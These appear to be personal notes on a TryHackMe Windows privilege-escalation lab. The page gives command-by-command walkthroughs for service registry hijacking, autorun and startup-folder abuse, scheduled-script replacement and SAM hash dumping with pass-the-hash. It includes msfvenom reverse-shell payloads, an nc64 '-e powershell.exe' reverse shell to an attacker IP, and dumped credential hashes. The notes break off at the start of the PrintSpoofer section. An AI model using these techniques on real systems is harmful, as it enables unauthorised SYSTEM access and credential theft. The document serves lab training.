# Windows Priv Esc techniques

## Contents

1. Weak service registry permissions
2. Autoruns in registry
3. Autologon credentials in registry
4. Saved creds
5. Unattend files
6. SAM/SYSTEM backups
7. Scheduled tasks
8. Weak permissions in StartUp folder
9. PrintSpoofer
10. Insecure service binaries
11. Unquoted service paths
12. Insecure service permissions
13. AlwaysInstallElevated

------

## Preparation

These were done in TryHackMe's [Windows 10 PrivEsc room](https://tryhackme.com/room/windows10privesc). The system used is

```text
C:\Temp>systeminfo
systeminfo

Host Name:                 WIN-QBA94KB3IOF
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00431-10000-00000-AA021
Original Install Date:     6/4/2020, 6:11:31 PM
System Boot Time:          5/24/2021, 9:14:48 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 981 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,267 MB
Virtual Memory: In Use:    933 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB4514366
                           [02]: KB4512577
                           [03]: KB4512578
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.228.2
                                 [02]: fe80::e512:4bbb:1273:452e
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

And the msfvenom payload binaries were these. Note that replacing service binaries best done with exe-service format.

```text
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=10.4.6.109 LPORT=443 -f exe -o shell443.exe

msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=10.13.17.54 LPORT=443 -f exe-service -o shell443.exe
```

## Weak service registry perms

### Detection

```text
+------+------------------------------------------------+------+
| TEST | SERVICES > Permissions - Registry              | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name              : regsvc
ImagePath         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
User              : LocalSystem
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc}
IdentityReference : NT AUTHORITY\INTERACTIVE
Permissions       : {WriteOwner, Delete, ReadControl, ReadData/ListDirectory...}
Status            : Stopped
UserCanStart      : True
UserCanRestart    : True
```

Verify it with
```text
PS HKLM:\> Get-Acl SYSTEM\CurrentControlSet\Services\regsvc | FL *
Get-Acl SYSTEM\CurrentControlSet\Services\regsvc | FL *


PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regs
                          vc
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName             : regsvc
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry
CentralAccessPolicyId   :
CentralAccessPolicyName :
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regs
                          vc
Owner                   : BUILTIN\Administrators
Group                   : NT AUTHORITY\SYSTEM
Access                  : {System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule}
Sddl                    : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
AccessToString          : Everyone Allow  ReadKey
                          NT AUTHORITY\INTERACTIVE Allow  FullControl
                          NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
AuditToString           :
AccessRightType         : System.Security.AccessControl.RegistryRights
AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
AreAccessRulesProtected : True
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True
```

We belong to NT AUTHORITY\INTERACTIVE group
```text
PS HKLM:\> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Check where it points to
```text
PS HKLM:\> Get-ItemProperty SYSTEM\CurrentControlSet\Services\regsvc
Get-ItemProperty SYSTEM\CurrentControlSet\Services\regsvc


Type         : 16
Start        : 3
ErrorControl : 1
ImagePath    : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
DisplayName  : Insecure Registry Service
ObjectName   : LocalSystem
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName  : regsvc
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

### Check svc permissions

```text
PS HKLM:\> ((sc.exe sdshow regsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"
((sc.exe sdshow regsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"

Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory,
Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Traverse, 
WriteExtendedAttributes)

PS HKLM:\> sc.exe query regsvc
sc.exe query regsvc

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

PS HKLM:\> sc.exe qc regsvc
sc.exe qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

This tells us we can start it. So let's hijack the binpath via registry
```text
PS HKLM:\> Set-ItemProperty HKLM:\System\CurrentControlSet\services\regsvc -Name "ImagePath" -Value "C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe"
Set-ItemProperty HKLM:\System\CurrentControlSet\services\regsvc -Name "ImagePath" -Value "C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe"
PS HKLM:\> Get-ItemProperty SYSTEM\CurrentControlSet\Services\regsvc
Get-ItemProperty SYSTEM\CurrentControlSet\Services\regsvc


Type         : 16
Start        : 3
ErrorControl : 1
ImagePath    : C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe
DisplayName  : Insecure Registry Service
ObjectName   : LocalSystem
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName  : regsvc
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry



PS HKLM:\> sc.exe qc regsvc
sc.exe qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

### Priv esc

```text
PS HKLM:\> sc.exe start regsvc
sc.exe start regsvc

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.6.109] from (UNKNOWN) [10.10.0.189] 49957
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

------

## Autorun in registry

### Detection

privesccheck
```text
+------+------------------------------------------------+------+
| TEST | APPS > Modifiable Apps Run on Startup          | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the system-wide applications that are run   |
|      | on start-up and check whether they can be modified by |
|      | the current user.                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name         : My Program
Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\My Program
Data         : "C:\Program Files\Autorun Program\program.exe"
IsModifiable : True
```
winpeas
```text
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: My Program
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe (Unquoted and Space detected)
    FilePerms: Everyone [AllAccess]
```

Enumerate the reg key
```text
PS C:\Users\user\Downloads> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run | FL *
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run | FL *


SecurityHealth : C:\Windows\system32\SecurityHealthSystray.exe
My Program     : "C:\Program Files\Autorun Program\program.exe"
PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
PSChildName    : Run
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
```

Check program.exe and its folder perms

```text
PS C:\Users\user\Downloads> Get-Acl "C:\Program Files\Autorun Program\program.exe" | Select-Object -Expand "AccessToString"
Get-Acl "C:\Program Files\Autorun Program\program.exe" | Select-Object -Expand "AccessToString"
Everyone Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
WIN-QBA94KB3IOF\Administrator Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
PS C:\Users\user\Downloads> Get-Acl "C:\Program Files\Autorun Program" | Select-Object -Expand "AccessToString"
Get-Acl "C:\Program Files\Autorun Program" | Select-Object -Expand "AccessToString"
NT SERVICE\TrustedInstaller Allow  FullControl
NT SERVICE\TrustedInstaller Allow  268435456
NT AUTHORITY\SYSTEM Allow  FullControl
NT AUTHORITY\SYSTEM Allow  268435456
BUILTIN\Administrators Allow  FullControl
BUILTIN\Administrators Allow  268435456
BUILTIN\Users Allow  ReadAndExecute, Synchronize
BUILTIN\Users Allow  -1610612736
CREATOR OWNER Allow  268435456
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
```
Looks like everyone can replace that binary. But not the folder in which it resides.

### Hijack autorun location

```text
C:\Users\user\Downloads>copy .\shell443.exe "C:\Program Files\Autorun Program\program.exe"
copy .\shell443.exe "C:\Program Files\Autorun Program\program.exe"
Overwrite C:\Program Files\Autorun Program\program.exe? (Yes/No/All): Yes
Yes
        1 file(s) copied.
```

Note we can shutdown or reboot system
```text
C:\Users\user\Downloads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Priv esc

Reboot the machine and sign in as admin user via RDP
```text
C:\Users\user\Downloads>shutdown /r /t 0
shutdown /r /t 0

root@kali:~/CTF/THM/WinPE# xfreerdp /u:admin /p:password123 /cert-ignore /v:10.10.147.11 /size:90% &

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.147.11] 49705
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

------

## Autologon credentials in Registry

```text
PS HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon> Get-ItemProperty .
Get-ItemProperty .


AutoRestartShell             : 1
Background                   : 0 0 0
CachedLogonsCount            : 10
DebugServerCommand           : no
DefaultDomainName            : DESKTOP-7I3S68E
DefaultUserName              : Administrator
DisableBackButton            : 1
EnableSIHostIntegration      : 1
ForceUnlockLogon             : 0
LegalNoticeCaption           :
LegalNoticeText              :
PasswordExpiryWarning        : 5
PowerdownAfterShutdown       : 0
PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
ReportBootOk                 : 1
Shell                        : explorer.exe
ShellCritical                : 0
ShellInfrastructure          : sihost.exe
SiHostCritical               : 0
SiHostReadyTimeOut           : 0
SiHostRestartCountLimit      : 0
SiHostRestartTimeGap         : 0
Userinit                     : C:\Windows\system32\userinit.exe,
VMApplet                     : SystemPropertiesPerformance.exe /pagefile
WinStationsDisabled          : 0
scremoveoption               : 0
DisableCAD                   : 1
LastLogOffEndTimePerfCounter : 215729203
ShutdownFlags                : 2147484203
AutoAdminLogon               : 1
DisableLockWorkstation       : 0
EnableFirstLogonAnimation    : 1
AutoLogonSID                 : S-1-5-21-988671444-1802818203-1364644418-500
LastUsedUsername             : Administrator
DefaultPassword              : 3130438f31186fbaf962f407711faddb
PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows
                               NT\CurrentVersion\Winlogon
PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows
                               NT\CurrentVersion
PSChildName                  : Winlogon
PSDrive                      : HKLM
PSProvider                   : Microsoft.PowerShell.Core\Registry
```

Note this works only if 

```text
PS HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon> [Environment]::Is64BitProcess
[Environment]::Is64BitProcess
True
```

------

## Saved creds

Note this didn't work consistently in TryHackMe.

```text
PS C:\Users\user\Downloads> cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

Run it like this

```text
PS C:\Users\user\Downloads> cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin

PS C:\Users\user\Downloads> runas /savecred /user:admin C:\Users\user\Downloads\shell443.exe
runas /savecred /user:admin C:\Users\user\Downloads\shell443.exe
```

------

## Unattend files

### Detection

winpeas
```text
  [+] Unattend Files
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>
```
Can be decoded
```text
root@kali:~/CTF/THM/WinPE# echo cGFzc3dvcmQxMjM | base64 -d
password123base64: invalid input
```

------

## SAM/SYSTEM Backups

### Detection

winpeas
```text
  [+] Looking for common SAM & SYSTEM backups
    C:\Windows\repair\SAM
    File Permissions: user [Read], Users [Read]

    C:\Windows\repair\SYSTEM
    File Permissions: user [Read], Users [Read]
```

privesccheck
```text
+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM Backup Files                | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether some backup files of the SAM/SYSTEM     |
|      | hives were created with insecure permissions."        |
+------+-------------------------------------------------------+
[*] Found 2 result(s).


Path : C:\Windows\repair\SAM

Path : C:\Windows\repair\system
```

### Pillaging

```text
root@kali:~/CTF/THM/WinPE# impacket-secretsdump LOCAL -sam SAM -system SYSTEM
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xf4fb8f729017b7d8a540e99f6dabea79
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
[*] Cleaning up...
```

### Priv esc

One is disabled, the other is not.

```text
root@kali:~/CTF/THM/WinPE# crackmapexec smb 10.10.147.11 -u Administrator -H :fc525c9683e8fe067095ba2ddc971889
SMB         10.10.147.11    445    WIN-QBA94KB3IOF  [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WIN-QBA94KB3IOF) (domain:WIN-QBA94KB3IOF) (signing:False) (SMBv1:True)
SMB         10.10.147.11    445    WIN-QBA94KB3IOF  [-] WIN-QBA94KB3IOF\Administrator::fc525c9683e8fe067095ba2ddc971889 STATUS_ACCOUNT_DISABLED
root@kali:~/CTF/THM/WinPE# crackmapexec smb 10.10.147.11 -u admin -H :a9fdfa038c4b75ebc76dc855dd74f0da
SMB         10.10.147.11    445    WIN-QBA94KB3IOF  [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WIN-QBA94KB3IOF) (domain:WIN-QBA94KB3IOF) (signing:False) (SMBv1:True)
SMB         10.10.147.11    445    WIN-QBA94KB3IOF  [+] WIN-QBA94KB3IOF\admin :a9fdfa038c4b75ebc76dc855dd74f0da (Pwn3d!)
```

------

### Detection

No easy way, since only can list all running tasks. Not in enum scripts. Look for scripts.

```text
PS C:\Users\user> Get-Content C:\DevTools\CleanUp.ps1
Get-Content C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
PS C:\Users\user> Get-Acl C:\DevTools\CleanUp.ps1
```

### Check perms

```text
PS C:\Users\user> Get-Acl C:\DevTools\CleanUp.ps1 | Select-Object -Expand "AccessToString"
Get-Acl C:\DevTools\CleanUp.ps1 | Select-Object -Expand "AccessToString"
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  Modify, Synchronize
WIN-QBA94KB3IOF\Administrator Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
```

Users can Modify.

### Priv esc

Replace cleanup.ps1 and wait
```text
PS C:\Users\user> copy \\10.13.17.54\kali\rshell.ps1 C:\DevTools\CleanUp.ps1
copy \\10.13.17.54\kali\rshell.ps1 C:\DevTools\CleanUp.ps1

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.130.57] 49827
Windows PowerShell running as user WIN-QBA94KB3IOF$ on WIN-QBA94KB3IOF
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
```

------

## Insecure GUI apps

### Detection

PS method [[ref](https://thinkpowershell.com/get-process-name-and-owner-user-name/)]. Note that the user running is sometimes displayed.
```text
PS C:\Users\user> Get-WmiObject Win32_Process | Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}} | Sort-Object UserName, Name
Get-WmiObject Win32_Process | Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}} | Sort-Object UserName, Name

Name                    UserName
----                    --------
amazon-ssm-agent.exe    \
CompatTelRunner.exe     \
CompatTelRunner.exe     \
conhost.exe             \
csrss.exe               \
csrss.exe               \
csrss.exe               \
dwm.exe                 \
dwm.exe                 \
fontdrvhost.exe         \
fontdrvhost.exe         \
fontdrvhost.exe         \
LiteAgent.exe           \
LogonUI.exe             \
lsass.exe               \
msdtc.exe               \
Registry                \
services.exe            \
smss.exe                \
spoolsv.exe             \
SppExtComObj.Exe        \
sppsvc.exe              \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
svchost.exe             \
System                  \
System Idle Process     \
taskhostw.exe           \
wininit.exe             \
winlogon.exe            \
winlogon.exe            \
wlms.exe                \
WmiPrvSE.exe            \
WmiPrvSE.exe            \
mspaint.exe             WIN-QBA94KB3IOF\admin
cmd.exe                 WIN-QBA94KB3IOF\user
conhost.exe             WIN-QBA94KB3IOF\user
conhost.exe             WIN-QBA94KB3IOF\user
ctfmon.exe              WIN-QBA94KB3IOF\user
dllhost.exe             WIN-QBA94KB3IOF\user
explorer.exe            WIN-QBA94KB3IOF\user
nc64.exe                WIN-QBA94KB3IOF\user
powershell.exe          WIN-QBA94KB3IOF\user
rdpclip.exe             WIN-QBA94KB3IOF\user
RuntimeBroker.exe       WIN-QBA94KB3IOF\user
RuntimeBroker.exe       WIN-QBA94KB3IOF\user
RuntimeBroker.exe       WIN-QBA94KB3IOF\user
SearchUI.exe            WIN-QBA94KB3IOF\user
ShellExperienceHost.exe WIN-QBA94KB3IOF\user
sihost.exe              WIN-QBA94KB3IOF\user
smartscreen.exe         WIN-QBA94KB3IOF\user
svchost.exe             WIN-QBA94KB3IOF\user
taskhostw.exe           WIN-QBA94KB3IOF\user
taskhostw.exe           WIN-QBA94KB3IOF\user
```

Note that Get-Process won't work for low priv users
```text
PS C:\Users\user> Get-Process -IncludeUserName
Get-Process -IncludeUserName
Get-Process : The 'IncludeUserName' parameter requires elevated user rights. Try running the command again in a
session that has been opened with elevated user rights (that is, Run as Administrator).
At line:1 char:1
+ Get-Process -IncludeUserName
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-Process], InvalidOperationException
    + FullyQualifiedErrorId : IncludeUserNameRequiresElevation,Microsoft.PowerShell.Commands.GetProcessCommand
```

Or more traditionally `tasklist /v`

------

## Weak permissions in StartUp folder

### Detection

winpeas under autorun
```text
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Users [AllAccess]
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: Users [AllAccess]
   =================================================================================================
```

Not found in privesc check? Verify perms 

```text
PS C:\Users\user\Downloads> Get-Acl "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Select-Object -Expand "AccessToString"
Get-Acl "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Select-Object -Expand "AccessToString"
BUILTIN\Users Allow  FullControl
WIN-QBA94KB3IOF\Administrator Allow  DeleteSubdirectoriesAndFiles, Delete
WIN-QBA94KB3IOF\admin Allow  DeleteSubdirectoriesAndFiles, Delete
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
Everyone Allow  ReadAndExecute, Synchronize
```
Users have Full Control over folder

### Create shortcut

With [Powershell](https://stackoverflow.com/questions/9701840/how-to-create-a-shortcut-using-powershell)
```powershell
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Temp\reverse443.lnk")
$Shortcut.TargetPath = "C:\Temp\shell443.exe"
$Shortcut.Save()
```

Note that for some reason you can't use the user's folder for this or when its transferred to the target folder it will "redirect" to the non-existent exe in admin folder. 

### Copy shortcut to location

```text
PS C:\Temp> copy .\reverse443.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
copy .\reverse443.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
PS C:\Temp> dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"


    Directory: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/24/2021   6:10 AM            571 reverse443.lnk
```

### Priv esc

After admin login with RDP (to trigger startup program)
```text
root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.230.132] 49811
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin
```

------

## PrintSpoofer

### Check privs

```text
root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.228.2] 49753
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
